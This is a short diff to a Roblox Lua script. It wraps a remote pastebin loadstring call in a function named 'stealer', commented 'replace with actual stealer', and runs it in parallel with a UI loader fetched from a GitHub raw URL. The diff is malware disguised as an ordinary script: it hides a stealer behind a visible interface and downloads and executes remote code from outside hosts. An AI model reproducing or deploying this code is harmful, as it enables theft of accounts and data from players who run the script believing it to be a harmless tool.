@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))()
+local function stealer()
+    loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas13119/Dds/refs/heads/main/ui"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
